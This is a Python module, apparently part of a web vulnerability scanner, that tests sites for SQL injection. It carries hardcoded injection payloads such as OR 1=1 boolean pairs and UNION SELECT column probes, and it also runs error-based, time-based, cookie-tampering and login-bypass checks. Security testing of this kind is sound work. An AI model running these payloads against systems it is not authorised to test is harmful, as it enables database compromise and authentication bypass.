import time
import asyncio
import re
import xml.etree.ElementTree as ET
from pathlib import Path
import random
import base64
import json
from difflib import SequenceMatcher

import components.main.report as report
from components.main.console import log_error, log_debug, log_vulnerability, log_detail, status_update
from components.attack.base_attack import BaseAttack
from components.parsers.html import HTML

class SQLInjection(BaseAttack):
    name = 'sqli'

    SPECIAL_CHARS = ["'", '"', ";", ")", "*"]
    ENCODED_CHARS = ["%27", "%22", "%3B", "%29", "%2A", "%25%27"]
    BOOLEAN_PAYLOAD_PAIRS = [
        ("' OR 1=1-- ",    "' OR 1=2-- "),
        ('" OR 1=1-- ',    '" OR 1=2-- '),
        (" OR 1=1-- ",     " OR 1=2-- "),
        ("' OR 'a'='a'-- ", "' OR 'a'='b'-- "),
        ('" OR "a"="a"-- ', '" OR "a"="b"-- '),
        ("') OR ('1'='1'-- ", "') OR ('1'='2'-- "),
        ('") OR ("1"="1"-- ', '") OR ("1"="2"-- '),
        ("' OR 'x'||'x'='x'-- ", "' OR 'x'||'x'='y'-- "),
        ("' OR TRUE-- ",    "' OR FALSE-- "),
        ("' OR 1=1# ",      "' OR 1=2# "),
        ("' OR 1=1/*",      "' OR 1=2/*"),
        ("' Or 1=1-- ",     "' Or 1=2-- "),
        ("' OR (SELECT 1)=1-- ", "' OR (SELECT 1)=2-- "),
    ]
    
    SKIP_PARAMS = ['user_token', 'csrf_token', 'session_id', 'auth_token', 'auth_key', 'token']

    def __init__(self, crawler, crawler_config, wordlist_path):
        super().__init__(crawler, crawler_config, wordlist_path)
        if not self.wordlist_path:
            self.payloads = self._load_payload_files()
            
        self.error_regexes = self._load_error_regexes()
        
        self.semaphore = asyncio.Semaphore(20)
        self.tested_cookies = set()
        self.logged_in = False
        
    def _load_payload_files(self):
        base = Path(__file__).parent.parent / 'payloads' / 'sqli'
        mapping = {
            'error': 'sqli_error.txt',
            'time': 'sqli_time.txt',
            'union': 'sqli_union.txt',
            'auth_bypass': 'sqli_auth_bypass.txt',
        }
        
        out = {}
        for kind, fname in mapping.items():
            path = base / fname
            try:
                with open(path, encoding='utf-8') as f:
                    lines = [l.strip() for l in f if l.strip() and not l.startswith('#')]
                out[kind] = lines
                
            except Exception as e:
                log_error(f"[sqli] cannot load payload file {path}: {e}")
                out[kind] = []
        return out

    def _load_error_regexes(self):

        xml_path = Path(__file__).parent.parent / 'payloads' / 'sqli' / 'database_errors.xml'
        db_regex_map = {}

        if not xml_path.exists():
            log_error(f"[sqli] error‐regex file not found: {xml_path}")
            return db_regex_map

        try:
            tree = ET.parse(xml_path)
            root = tree.getroot()
            # iterate over each <dbms value="...">
            for dbms in root.findall('.//dbms'):
                db_name = dbms.get('value')
                if not db_name:
                    continue

                regex_list = []
                for err in dbms.findall('error'):
                    pat = err.get('regexp')
                    if not pat:
                        continue
                    try:
                        regex_list.append(re.compile(pat, re.IGNORECASE))
                    except re.error as rex:
                        log_error(f"[sqli] invalid regex {pat} for {db_name} in {xml_path}: {rex}")

                if regex_list:
                    db_regex_map[db_name] = regex_list

        except Exception as e:
            log_error(f"[sqli] failed to parse {xml_path}: {e}")

        return db_regex_map


    async def run(self, request, response):
        status_update(request.url)
        
        request_html = HTML(response.text, str(request.url))
        if request_html.logged_in():
            self.logged_in = True
            
        await self.test_cookies(request, response)
        
        if not request.get_params and not request.post_params:
            return
        
        vulnerable_parameters = await self.potentially_injectable(request)
        if not vulnerable_parameters:
            return
        
        html = HTML(response.text, str(response.url))
        login_form, _, _ = html.find_login_form()
        
        if login_form and request == login_form:
            auth_bypass_tasks = []
            for payload in self.payloads['auth_bypass']:
                for mutated, param in self.mutate_request(request, payload, mode='append'):
                    if param in self.SKIP_PARAMS:
                        continue
                    auth_bypass_tasks.append(asyncio.create_task(self._test_auth_bypass(mutated, request, html, param, payload)))
            try:
                for task in asyncio.as_completed(auth_bypass_tasks):
                    if await task:
                        for t in auth_bypass_tasks:
                            t.cancel()
                        return
            finally:
                for t in auth_bypass_tasks:
                    if not t.done():
                        t.cancel()
    
        error_tasks = []
        for payload in self.payloads['error']:
            for mutated, param in self.mutate_request(request, payload, mode='append'):
                if param in self.SKIP_PARAMS:
                        continue
                if param in vulnerable_parameters:
                    error_tasks.append(asyncio.create_task( self._test_error(mutated, request, param, payload)))
        
        try:
            for task in asyncio.as_completed(error_tasks):
                if await task:
                    for t in error_tasks:
                        t.cancel()
                    return
        finally:
            for t in error_tasks:
                if not t.done():
                    t.cancel()
        

        for param in vulnerable_parameters:
            if await self._test_union(request, param):
                return

    
        base_response_time = getattr(response, 'elapsed', None)
        if base_response_time is not None:
            try:
                base_response_time = base_response_time.total_seconds()
            except AttributeError:
                base_response_time = float(base_response_time)
        else:
            base_response_time = 0

        time_tasks = []
        for payload in self.payloads['time']:
            for mutated, p in self.mutate_request(request, payload, mode='append'):
                if p in self.SKIP_PARAMS:
                        continue
                if p in vulnerable_parameters:
                    time_tasks.append(asyncio.create_task(
                        self._test_time_payload(mutated, param, payload, base_response_time)
                    ))

        try:
            for task in asyncio.as_completed(time_tasks):
                if await task:
                    for t in time_tasks:
                        t.cancel()
                    return
            
        finally:
            for t in time_tasks:
                if not t.done():
                    t.cancel()
                    
    async def _test_auth_bypass(self, mutated, request, html, param, payload):
        
        if self.logged_in:
            return False
        
        try:
            async with self.semaphore:
                resp = await self.crawler.send(mutated, timeout=3)
                
        except Exception as e:
            return False
        
        resp_html = HTML(resp.text, str(resp.url))
        if resp_html.logged_in():
            log_vulnerability('CRITICAL', f'SQL Injection Auth Bypass Detected')
            log_detail('Target', mutated.url)
            log_detail('Method', mutated.method)
            log_detail('Parameter', param)
            log_detail('Payload', payload)
            log_detail('Response Status Code', resp.status_code)
            
            report.report_vulnerability(
                severity='CRITICAL',
                category='SQL Injection',
                description='SQL Injection Auth Bypass Detected',
                details={
                    'Target': mutated.url,
                    'Method': mutated.method,
                    'Parameter': param,
                    'Payload': payload,
                    'Response Status Code': resp.status_code,
                }
            )
            print()
            return True
        
    async def _test_time_payload(self, mutated, param, payload, base_response_time):
        try:
            async with self.semaphore:
                start = time.time()
                resp = await self.crawler.send(mutated, timeout=10)
                
        except Exception:
            return None
        
        elapsed = time.time() - start
        if elapsed - base_response_time >= 4.5:
            log_vulnerability('CRITICAL', f'Time-based SQL Injection detected')
            log_detail('Target', mutated.url)
            log_detail('Method', mutated.method)
            log_detail('Parameter', param)
            log_detail('Payload', payload)
            log_detail('Baseline Response Time', base_response_time)
            log_detail('Response Time', elapsed)
            log_detail('Delta', elapsed - base_response_time)
            report.report_vulnerability(
                severity='CRITICAL',
                category='SQL Injection',
                description='Time-based SQL Injection detected',
                details={
                    'Target': mutated.url,
                    'Method': mutated.method,
                    'Parameter': param,
                    'Payload': payload,
                    'Baseline Response Time': base_response_time,
                    'Response Time': elapsed,
                    'Delta': elapsed - base_response_time
                }
            )
            print()
            return param
        return None



    async def test_cookies(self, request, response):
       
        cookies = self.crawler.cookies.jar
        
        for cookie in cookies:
            trials = []
            name = cookie.name
            val = cookie.value
            
            # print(f"Testing cookie: {name} = {val}")
            # print(self.tested_cookies)
            # print()
            if name in self.tested_cookies:
                continue
            
            decoded_data = None

            # for payload in self.SPECIAL_CHARS:
            #     trials.append((val + payload, f"{name} raw + {payload!r}"))

            try:
                decoded = base64.b64decode(val).decode("utf-8")
                data = json.loads(decoded)
                decoded_data = data.copy()
                
                for field, fld_val in data.items():
                    if isinstance(fld_val, str):
                        for payload in self.SPECIAL_CHARS:
                            obj = data.copy()
                            obj[field] = fld_val + payload
                            new_b64 = base64.b64encode(
                                json.dumps(obj).encode()
                            ).decode()
                            desc = f"{name} : {field}  + {payload}"
                            trials.append((new_b64, desc))
                       
            except Exception:
                pass

            orig_headers = dict(self.crawler.headers)
            for new_val, desc in trials:
                temp_headers = dict(orig_headers)   
                temp_headers['Cookie'] = "; ".join(
                    f"{cookie.name}={new_val if cookie.name == name else cookie.value}"
                    for cookie in cookies
                )

                try:
                    resp = await self.crawler.send(request, timeout=1, headers=temp_headers)
                except Exception:
                    continue
                
                
                if self._find_error(resp.text):
                    log_vulnerability('HIGH', "SQL Injection via cookie detected")
                    log_detail("Target",  request.url)
                    log_detail("Cookie mutation", desc)
                    log_detail('Decoded cookie', decoded_data )
                    
                    report.report_vulnerability(
                        severity='HIGH',
                        category='SQL Injection',
                        description="SQL Injection via cookie detected",
                        details={
                            "Target": request.url,
                            "Cookie mutation": desc,
                        }
                    )
                    print()
                    
                    self.tested_cookies.add(name)
                    
                    return 
                
                if resp.status_code != response.status_code:
                    log_vulnerability('MEDIUM', "SQL Injection via cookie detected (status code change)")
                    log_detail("Target", request.url)
                    log_detail("Cookie mutation", desc)
                    log_detail("Decoded cookie", decoded_data)
                    log_detail("Status code changed from", f"{response.status_code}")
                    log_detail("To", resp.status_code)
                    
                    report.report_vulnerability(
                        severity='MEDIUM',
                        category='SQL Injection',
                        description="SQL Injection via cookie detected (status code change)",
                        details={
                            "Target": request.url,
                            "Cookie mutation": desc,
                            "Status code changed from": response.status_code,
                            "To": resp.status_code
                        }
                    )
                    print()
                    
                    self.tested_cookies.add(name)
                    return 

        return 
       
    async def potentially_injectable(self, request):
        vulnerable_parameters = set()
        all_params = set(request.get_params or request.post_params)

        async def _test_error_payload(mutated, param, payload):
            try:
                async with self.semaphore:
                    resp = await self.crawler.send(mutated, timeout=1)
            except Exception:
                return None
            return param if self._find_error(resp.text) else None

        # Phase 1: Special-char probes
        special_tasks = []
        for char in self.SPECIAL_CHARS:
            for mut, param in self.mutate_request(request, char, mode='append'):
                if param not in self.SKIP_PARAMS:
                    special_tasks.append(asyncio.create_task(_test_error_payload(mut, param, char)))    
        
        for task in asyncio.as_completed(special_tasks):
            param = await task
            if param:
                vulnerable_parameters.add(param)
                if vulnerable_parameters == all_params:
                    # cancel leftovers
                    for t in special_tasks:
                        if not t.done():
                            t.cancel()
                    return vulnerable_parameters

        # Phase 2: URL-/double-encoding tricks
        encoded_tasks = [
            asyncio.create_task(_test_error_payload(mut, param, enc))
            for enc in self.ENCODED_CHARS
            for mut, param in self.mutate_request(request, enc, mode='append')
            if param not in vulnerable_parameters and param not in self.SKIP_PARAMS
        ]
        for task in asyncio.as_completed(encoded_tasks):
            param = await task
            if param:
                vulnerable_parameters.add(param)
                if vulnerable_parameters == all_params:
                    for t in encoded_tasks:
                        if not t.done():
                            t.cancel()
                    return vulnerable_parameters

        # Phase 3: Boolean flips
        async def _test_boolean_pair(mutated_true, mutated_false, param):
            try:
                async with self.semaphore:
                    resp_t = await self.crawler.send(mutated_true, timeout=1)
                    resp_f = await self.crawler.send(mutated_false, timeout=1)
            except Exception:
                return None

            if resp_t.status_code != resp_f.status_code:
                return param
            if abs(len(resp_t.text) - len(resp_f.text)) > 10:
                return param
            if SequenceMatcher(None, resp_t.text, resp_f.text).ratio() < 0.95:
                return param
            return None

        boolean_tasks = []
        for payload_true, payload_false in self.BOOLEAN_PAYLOAD_PAIRS:
            trues = list(self.mutate_request(request, payload_true,  mode='append'))
            falses = list(self.mutate_request(request, payload_false, mode='append'))
            for (mutated_true, p1), (mutated_false, p2) in zip(trues, falses):
                if p1 == p2 and p1 not in vulnerable_parameters:
                    boolean_tasks.append(asyncio.create_task(_test_boolean_pair(mutated_true, mutated_false, p1)))

        for task in asyncio.as_completed(boolean_tasks):
            param = await task
            if param:
                vulnerable_parameters.add(param)
                if vulnerable_parameters == all_params:
                    for t in boolean_tasks:
                        if not t.done():
                            t.cancel()
                    break

        return vulnerable_parameters
    
    def _find_error(self, text):
        text_small = text
        for dbms, regexes in self.error_regexes.items():
            for regex in regexes:
                if regex.search(text_small):
                    return str(dbms)
        return ''
        
    async def _false_positive(self, request):
        try:
            resp = await self.crawler.send(request, timeout = 3)
            
        except Exception:
            pass
        
        else:
            if self._find_error(resp.text):
                return True
            
        return False

    async def _test_error(self, mutated, request, param, payload):
        
        #log_debug(f"{mutated} Testing {param} (error) with payload {payload!r}")
        
        try:
            async with self.semaphore:
                resp = await self.crawler.send(mutated, timeout = 3, redirect = False)
                text = resp.text
            
        except Exception as e:
            log_error(f"Error-based request failed {mutated}: {e}")
            return False
        
        else:
            vulnerability = self._find_error(text)

            if vulnerability and not await self._false_positive(request):
                log_vulnerability('CRITICAL', f'SQL Injection Error Based Detected')
                log_detail('Target', mutated.url)
                log_detail('Method', mutated.method)
                log_detail('Parameter', param)
                log_detail('Payload', payload)
                log_detail('Database', vulnerability)
                
                report.report_vulnerability(
                    severity='CRITICAL',
                    category='SQL Injection',
                    description='SQL Injection Error Based Detected',
                    details={
                        'Target': mutated.url,
                        'Method': mutated.method,
                        'Parameter': param,
                        'Payload': payload,
                        'Database': vulnerability
                    }
                )
                
                print()
                
                return True
                
            return False        
                
                    
    async def _test_union(self, request, param):
        max_columns = 12
        col_count   = None

        for n in range(1, max_columns + 1):
            nulls   = ",".join(["NULL"] * n)
            payload = f"' UNION SELECT {nulls}--"

            for mutated, p in self.mutate_request(request, payload, mode='append'):
                if p != param:
                    continue
                try:
                    resp = await self.crawler.send(mutated, timeout=5, redirect=False)
                except Exception:
                    break

                if resp.status_code < 500:
                    col_count = n
                break

            if col_count:
                break

        if not col_count:
            return False 

   
        markers = [
            f"{random.getrandbits(32):08X}"
            for _ in range(col_count)
        ]

        for idx, marker in enumerate(markers):
            # build a payload that injects our marker into column `idx`
            cols = []
            for j in range(col_count):
                if j == idx:
                    # use CONCAT + <mark> tags to survive HTML-escaping
                    cols.append(f"0x{int(marker,16):X}")
                else:
                    cols.append("NULL")

            payload = f"' UNION SELECT {','.join(cols)}--"

            for mutated, p in self.mutate_request(request, payload, mode='append'):
                if p != param:
                    continue
                try:
                    resp = await self.crawler.send(mutated, timeout=5, redirect=False)
                except Exception:
                    continue
                if resp.status_code >= 500:
                    continue
                if marker in resp.text:
                    log_vulnerability('CRITICAL', f"SQL Injection UNION based detected")
                    log_detail('Target', mutated.url)
                    log_detail('Method', mutated.method)
                    log_detail('Parameter', param)
                    log_detail('Payload', payload)
                    print()
                    
                    report.report_vulnerability(
                        severity='CRITICAL',
                        category='SQL Injection',
                        description='SQL Injection UNION based SQLi detected',
                        details={
                            'Target': mutated.url,
                            'Method': mutated.method,
                            'Parameter': param,
                            'Payload': payload
                        }
                    )
                    return True
                    

        return False
    
    
    